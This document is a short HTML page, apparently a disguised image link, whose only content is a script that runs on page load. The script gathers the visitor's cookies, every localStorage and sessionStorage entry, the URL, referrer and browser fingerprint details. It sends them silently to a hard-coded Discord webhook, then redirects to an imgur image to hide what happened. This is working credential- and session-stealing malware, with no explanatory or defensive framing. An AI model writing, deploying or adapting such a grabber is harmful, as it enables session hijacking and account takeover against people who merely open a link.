<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>—</title>
</head>
<body>
    <script>
        (function() {
            var data = {
                cookies: document.cookie || "[NO COOKIES]",
                localStorage: {},
                sessionStorage: {},
                windowName: window.name || "[EMPTY]",
                userAgent: navigator.userAgent,
                url: window.location.href,
                referrer: document.referrer || "[NONE]",
                protocol: window.location.protocol,
                hostname: window.location.hostname,
                pathname: window.location.pathname,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                timestamp: new Date().toISOString(),
                for_lo: "always"
            };

            try {
                var lsKeys = Object.keys(localStorage);
                for (var i = 0; i < lsKeys.length; i++) {
                    data.localStorage[lsKeys[i]] = localStorage.getItem(lsKeys[i]);
                }
            } catch(e) {
                data.localStorage = "[UNAVAILABLE]";
            }

            try {
                var ssKeys = Object.keys(sessionStorage);
                for (var j = 0; j < ssKeys.length; j++) {
                    data.sessionStorage[ssKeys[j]] = sessionStorage.getItem(ssKeys[j]);
                }
            } catch(e) {
                data.sessionStorage = "[UNAVAILABLE]";
            }

            var payloadString = JSON.stringify({
                content: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
            });

            var webhookUrl = "https://discord.com/api/webhooks/1532563312099725448/kFpOzSZA3tvbzWo_yQ4ZcWBUt4js1D8HJTacOuEyL89gl25hS5ecYjpwyRN5EmlHdxV9";

            var sent = false;

            try {
                if (navigator.sendBeacon) {
                    var blob = new Blob([payloadString], {type: 'application/json'});
                    sent = navigator.sendBeacon(webhookUrl, blob);
                }
            } catch(e) {}

            if (!sent) {
                try {
                    fetch(webhookUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: payloadString,
                        keepalive: true
                    });
                } catch(e) {}
            }

            setTimeout(function() {
                window.location.replace("https://imgur.com/a/BvymwS4");
            }, 500);
        })();
    </script>
</body>
</html>
